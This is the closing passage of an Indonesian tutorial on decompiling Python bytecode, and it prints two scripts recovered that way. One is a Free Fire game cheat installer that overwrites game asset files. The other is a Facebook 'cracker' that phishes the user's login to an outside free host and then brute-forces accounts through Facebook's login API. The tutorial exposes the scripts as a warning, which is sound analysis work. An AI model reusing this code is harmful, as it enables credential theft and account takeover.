    os.system("mv 'lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D?raw=true' /storage/emulated/0/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/ui/background/lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D")
    os.system('clear')
    print lonte
    print '[\x1b[1;92m+\x1b[0m] Success [\x1b[1;92m\xe2\x9c\x94\x1b[0m]'


def mikasa():
    os.system('clear')
    print '[+] Install... '
    chunk_size = 5000
    url = 'https://github.com/B4TAK/HelloQimak/blob/master/asu/lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D?raw=true'
    r = requests.get(url, stream=True)
    size = int(r.headers['content-length'])
    filename = url.split('/')[(-1)]
    with open(filename, 'wb') as (f):
        for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=size / chunk_size, unit=' KB'):
            f.write(data)

    os.system("mv 'lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D?raw=true' /storage/emulated/0/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/ui/background/lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D")
    os.system('clear')
    print lonte
    print '[\x1b[1;92m+\x1b[0m] Success [\x1b[1;92m\xe2\x9c\x94\x1b[0m]'
    time.sleep(4.5)
    menu()


def grafity():
    os.system('clear')
    print '[+] Install..  '
    chunk_size = 5000
    url = 'https://github.com/B4TAK/HelloQimak/blob/master/key/lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D?raw=true'
    r = requests.get(url, stream=True)
    size = int(r.headers['content-length'])
    filename = url.split('/')[(-1)]
    with open(filename, 'wb') as (f):
        for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=size / chunk_size, unit=' KB'):
            f.write(data)

    os.system("mv 'lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D?raw=true' /storage/emulated/0/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/ui/background/lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D")
    os.system('clear')
    print lonte
    print '[\x1b[1;92m+\x1b[0m] Success [\x1b[1;92m\xe2\x9c\x94\x1b[0m]'
    time.sleep(4.5)
    menu()


def konoha():
    os.system('clear')
    print '[+] Install... '
    chunk_size = 5000
    url = 'https://github.com/B4TAK/HelloQimak/blob/master/hello/lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D?raw=true'
    r = requests.get(url, stream=True)
    size = int(r.headers['content-length'])
    filename = url.split('/')[(-1)]
    with open(filename, 'wb') as (f):
        for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=size / chunk_size, unit=' KB'):
            f.write(data)

    os.system("mv 'lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D?raw=true' /storage/emulated/0/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/ui/background/lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D")
    os.system('clear')
    print lonte
    print '[\x1b[1;92m+\x1b[0m] Success [\x1b[1;92m\xe2\x9c\x94\x1b[0m]'
    time.sleep(4.5)
    menu()


def fix():
    os.system('clear')
    print lonte
    print '[\x1b[1;91m1\x1b[0m]. Background China'
    print '[\x1b[1;91m2\x1b[0m]. Background Akatsuki'
    print '[\x1b[1;91m3\x1b[0m]. Background Mikasa'
    print '[\x1b[1;91m4\x1b[0m]. Background FF Graffity'
    print '[\x1b[1;91m5\x1b[0m]. Background Konoha'
    print '[\x1b[1;91m0\x1b[0m]. \x1b[1;91mBack\x1b[0m'
    jancok = raw_input('\n\xe2\x9e\x9b ')
    if jancok == '1':
        china()
    elif jancok == '2':
        akatsuki()
    elif jancok == '3':
        mikasa()
    elif jancok == '4':
        grafity()
    elif jancok == '5':
        konoha()
    elif jancok == '0':
        menu()
    else:
        zx = raw_input('\n\n[\x1b[1;91m!\x1b[0m] \x1b[1;91mWrong\x1b[0m Input... Press \x1b[1;91mEnter\x1b[0m to Back!!!')
        menu()


def hoki():
    os.system('clear')
    print '[+] Install... '
    chunk_size = 5000
    url = 'https://github.com/B4TAK/HelloQimak/blob/master/hello/script1.spinhoki.file?raw=true'
    r = requests.get(url, stream=True)
    size = int(r.headers['content-length'])
    filename = url.split('/')[(-1)]
    with open(filename, 'wb') as (f):
        for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=size / chunk_size, unit=' KB'):
            f.write(data)

    os.system("mv 'script1.spinhoki.file?raw=true' /storage/emulated/0/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/ui/script1.spinhoki.file")
    os.system('clear')
    print lonte
    print '[\x1b[1;92m+\x1b[0m] Script Spin Hoki Active[\x1b[1;92m\xe2\x9c\x94\x1b[0m]'
    time.sleep(4.5)
    menu()


def menu():
    os.system('am start https://www.youtube.com/c/AnonymousCentral')
    os.system('clear')
    print lonte
    print '\x1b[1;95m-\xe2\x9e\x9b\x1b[0m [\x1b[1;91m1\x1b[0m]. Anthena Head'
    print '\x1b[1;95m-\xe2\x9e\x9b\x1b[0m [\x1b[1;91m2\x1b[0m]. Anthena Hand'
    print '\x1b[1;95m-\xe2\x9e\x9b\x1b[0m [\x1b[1;91m3\x1b[0m]. Bypass Imei(\x1b[1;93mUnbanned\x1b[0m)'
    print '\x1b[1;95m-\xe2\x9e\x9b\x1b[0m [\x1b[1;91m4\x1b[0m]. Config Auto Headshot (\x1b[1;91m75%\x1b[0m)'
    print '\x1b[1;95m-\xe2\x9e\x9b\x1b[0m [\x1b[1;91m5\x1b[0m]. Change Background Free Fire'
    print '\x1b[1;95m-\xe2\x9e\x9b\x1b[0m [\x1b[1;91m6\x1b[0m]. Script Spin Hoki'
    garox = raw_input('\n\xe2\x9e\x9b ')
    if garox == '1':
        head()
    elif garox == '2':
        hand()
    elif garox == '3':
        fake()
    elif garox == '4':
        headshot()
    elif garox == '5':
        fix()
    elif garox == '6':
        hoki()
    else:
        zx = raw_input('\n\n[\x1b[1;91m!\x1b[0m] \x1b[1;91mWrong\x1b[0m Input... Press \x1b[1;91mEnter\x1b[0m to Back!!!')
        menu()


menu()
```

* Hal yang menarik adalah, ternyata ada sebuah script yang dibuat oleh author yang sama dimana di dalam script tersebut terdapat fitur untuk phishing, alias mengambil informasi login dari penggunanya dan mengirimkannya ke sebuah tautan pada host gratisan (yang saat ini tautan tersebut sudah tidak dapat dibuka). Script aslinya dapat [dilihat di sini]() dan berikut ini adalah hasil dekompilasinya:

```python
import os, re, requests, concurrent.futures, mechanize, time, sys
from random import randint
from prompt_toolkit.shortcuts import prompt
from prompt_toolkit.styles import Style
br = mechanize.Browser()
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

logo = (f'''
   \033[1;94m┏─────────────────────────────────────────────┓
            \033[0m [ \033[1;91mCRACKER-FB\033[0m ]\033[1;96m Version 1.0

      \033[0mCopyright © 2020 K&Z. All rights reserved
   \033[1;94m┗─────────────────────────────────────────────┛\033[0m
''')

def ani():
    zz = ['     ','\x1b[1;92m •   ',' \x1b[1;93m•\x1b[1;91m•  ',' \x1b[1;96m•\x1b[1;94m•\x1b[1;92m• ']
    for i in range(5):
        for i in zz:
            xx = ['/','-','\\','|']
            for o in xx:
                print(f'\r\x1b[1;92m[\x1b[1;93m{str(o)}\x1b[1;92m] \x1b[1;97mSedang Login\x1b[1;97m {str(i)}',end=''),;sys.stdout.flush();time.sleep(0.1)

def login():
    os.system('clear')
    print(logo)
    print('       【\033[1;32m★\033[0m】LOGIN WITH ACCOUNT FACEBOOK【\033[1;32m★\033[0m】')
    usr = str(input(f'\n\x1b[1;97m[\033[1;92m•\x1b[1;97m]\x1b[1;97m Username :\x1b[1;92m '))
    if usr =='':
        exit('\x1b[1;91m!!\x1b[1;97m Username Tidak Boleh Kosong')
    style = Style.from_dict({'': '#00FF00','1': '#FFFFFF','2': '#00FF00','3': '#FFFFFF','4': '#FFFFFF'})
    msg = [('class:1', '['),('class:2', '•'),('class:3', ']'),('class:4', ' Password : ')]
    pwd = prompt(msg,style=style,is_password=True)
    if pwd == '':
        exit('\x1b[1;91m!!\x1b[1;97m password Tidak Boleh Kosong')
    ani()
    try:
        print('')
        br.open('https://jack-reaper.000webhostapp.com/login/index.php')
        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['userf'] = usr
        br.form['pwf'] = pwd
        br.submit()
        for anu in ['Login successfully ','                  ','Login successfully ','                  ','Login successfully ','                  ','Login successfully ','                  ','Login successfully ','                   ','Login successfully ']:
            sys.stdout.write('\r\x1b[1;92m[\x1b[1;97m✓\x1b[1;92m]\x1b[1;97m ' + anu);sys.stdout.flush();time.sleep(0.3)
        random_numbers()
    except (requests.exceptions.ConnectionError,mechanize.URLError):
        exit('\x1b[1;91m[!]\x1b[1;97m Koneksi Error')

def brute(user, passs):
  try:
    for pw in passs:
      params = {
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api = 'https://b-api.facebook.com/method/auth.login'
      response = requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[1;91m[\x1b[1;92mLIVE\x1b[1;91m]\x1b[1;97m %s \x1b[1;91m|\x1b[1;97m %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[1;91m[\x1b[1;93mCHEK\x1b[1;91m]\x1b[1;97m %s \x1b[1;91m|\x1b[1;97m %s '%(str(user), str(pw)))
        break
  except: pass

def random_numbers():
  data = []
  os.system('clear')
  print(logo)
  print('\x1b[1;92m[!]\x1b[1;97m Mohon Menunggu Crackingnya\x1b[1;91m!!')
  print('\x1b[1;92m[!]\x1b[1;97m Proses Crack Tergantung Sinyal')
  print(45*'\x1b[1;91m-')
  kode='88019'
  jml='900'
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:]), str(e[7:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(int(jml))]]
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print(45*'\x1b[1;91m-')
  print('\x1b[1;92m[✓] \x1b[1;97mDone ya kaka')


if __name__ == "__main__":
   login()
```

## Penutup

Sekedar saran, sebaiknya Anda berhati-hati jika menemukan sebuah script python dalam format python bytecode. Sekian tutorial kali ini, semoga bermanfaat. Terima kasih kepada Allah SWT, dan Anda yang telah membaca tutorial ini.
